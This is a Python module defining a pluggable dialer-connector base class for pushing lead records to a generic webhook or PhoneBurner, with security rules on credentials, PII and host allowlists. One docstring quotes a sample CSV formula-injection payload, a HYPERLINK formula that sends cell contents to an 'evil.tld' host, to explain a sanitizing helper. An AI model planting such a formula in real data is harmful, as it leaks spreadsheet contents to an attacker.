"""Dialer connector abstraction.

The shipped P5 dialer push is vendor-agnostic (a generic webhook/Zapier hook).
This package makes the push PLUGGABLE so native per-dialer connectors (e.g.
PhoneBurner) can slot into the same `dialer_push_sweep` without rewriting it.

A `DialerConnector` turns dialer-ready lead rows into one or more transport-ready
delivery requests. The sweep dispatches on `deliver.dialer_type` (validated at the
API boundary against `REGISTERED_DIALER_VENDOR_IDS`).

SECURITY INVARIANTS every connector must uphold (see docs/dialer_connectors_spike.md):
- Vendor credentials are NEVER returned in a request that becomes a Celery task arg
  (they would serialize into the Redis broker/result backend). The transport
  re-reads credentials from the DB just before the POST. A connector returns only
  non-secret request shape; secret material is fetched at send time.
- Every connector carries contact PII → `carries_pii = True` so the transport
  redacts vendor response bodies (which often echo submitted PII on error).
- A native connector pins its destination to a hardcoded HTTPS host allowlist; the
  URL is never taken from user config.
"""
from abc import ABC, abstractmethod

from src.config.constants import DEFAULT_DIALER_VENDOR_ID, REGISTERED_DIALER_VENDOR_IDS


class DialerConnector(ABC):
    """Base class for dialer-push connectors.

    Subclasses set ``VENDOR_ID`` (must be in ``REGISTERED_DIALER_VENDOR_IDS``) and
    implement ``validate_config`` + ``build_requests``. ``map_dnc_status`` is shared
    (honest labeling: a number is "clear" only when ``phone_dnc_flag`` is explicitly
    False; NULL = "unknown", since BridgeLeads has no DNC feed).
    """

    VENDOR_ID: str = ""
    # All dialer connectors transmit contact PII (name/phone/email) to a third
    # party, so the transport must redact vendor response bodies for all of them.
    carries_pii: bool = True
    # Generic webhook = ONE batch POST on the existing deliver_job_webhook path.
    # A bulk-less native vendor (no batch endpoint) sets uses_outbox=True so the
    # sweep materializes a per-contact dialer_deliveries row per lead and the
    # process_dialer_outbox transport drains them one POST at a time with durable
    # per-row replay (Codex: partial success is the norm without a bulk endpoint).
    uses_outbox: bool = False
    # Hardcoded HTTPS host allowlist for a native vendor's fixed endpoint. The
    # transport asserts every built request URL's host is in here, so a typo'd
    # default or future config-driven base_url can't ship PII + a bearer token to
    # an arbitrary host. Empty for the generic connector (user picks the URL,
    # guarded by validate_outbound_webhook instead).
    ALLOWED_HOSTS: frozenset[str] = frozenset()

    @abstractmethod
    def validate_config(self, deliver: dict) -> None:
        """Raise ValueError if the connector's slice of ``deliver`` config is invalid."""

    @abstractmethod
    def build_requests(self, leads: list[dict], job_meta: dict) -> list[dict]:
        """Turn dialer-ready leads into transport-ready delivery request dicts.

        Returns a list of requests the sweep enqueues. Generic returns ONE request
        (the whole batch); a bulk-less vendor returns one per contact. A request
        MUST NOT carry secret material (see module docstring) — the transport adds
        auth from the DB at send time.
        """

    @staticmethod
    def map_dnc_status(phone_dnc_flag: bool | None) -> str:
        return (
            "clear" if phone_dnc_flag is False
            else ("dnc" if phone_dnc_flag is True else "unknown")
        )

    @staticmethod
    def spreadsheet_safe(value: str | None) -> str:
        """Neutralize a county-derived free-text field for a destination whose
        predictable downstream use is a spreadsheet.

        THIS IS A PER-DESTINATION POLICY, NOT A GLOBAL ONE — read before reusing.

        A county filing is untrusted input and can carry an owner name like
        `=HYPERLINK("https://evil.tld/x?d="&A1&A2,"Open")`. Our own CSV/XLSX
        exports already neutralize that at generation time. The question for a
        PUSH destination is whether it is a spreadsheet context:

        - PhoneBurner: YES. Customers routinely export dialer contacts to
          CSV/Excel, so we must not hand it a live formula. Use this helper.
        - Generic customer webhook: NO. JSON is not an injection context, and
          prefixing an apostrophe would corrupt the value for every consumer
          forever, including the majority that never touch a spreadsheet.
          Deliberately does NOT use this helper.

        Sanitizing at INGEST instead was considered and rejected: it corrupts the
        canonical value, can shift dedup hashing, and would need a migration to
        cover rows already stored.

        Apply to free text only. Do NOT apply to phone numbers: a phone in E.164
        starts with "+", which is a formula prefix, so sanitizing it yields
        "'+12065551234" and breaks dialing — a functional regression in exchange
        for no real protection, since phone/email come from the enrichment
        provider rather than from county HTML.
        """
        from src.api.middleware.security import sanitize_for_csv

        return sanitize_for_csv(value)


def get_connector(vendor_id: str | None) -> DialerConnector:
    """Resolve a connector instance for ``deliver.dialer_type``.

    Lazy-imports the connector module so importing this package never pulls a
    connector's heavy deps (or the Celery app) into a light caller. Rejects any id
    not on the server-side allowlist (defense against an arbitrary discriminator
    reaching dispatch — the Pydantic validator is the first gate, this is the second).
    """
    vid = vendor_id or DEFAULT_DIALER_VENDOR_ID
    if vid not in REGISTERED_DIALER_VENDOR_IDS:
        raise ValueError(f"Unknown dialer_type: {vid!r}")

    if vid == "generic_webhook":
        from src.workers.dialer_connectors.generic_webhook import GenericWebhookConnector
        return GenericWebhookConnector()
    if vid == "phoneburner":
        from src.workers.dialer_connectors.phoneburner import PhoneBurnerConnector
        return PhoneBurnerConnector()

    # Should be unreachable: a value in REGISTERED_DIALER_VENDOR_IDS with no
    # dispatch arm means the allowlist and the registry drifted.
    raise ValueError(f"dialer_type {vid!r} is allowlisted but has no connector")
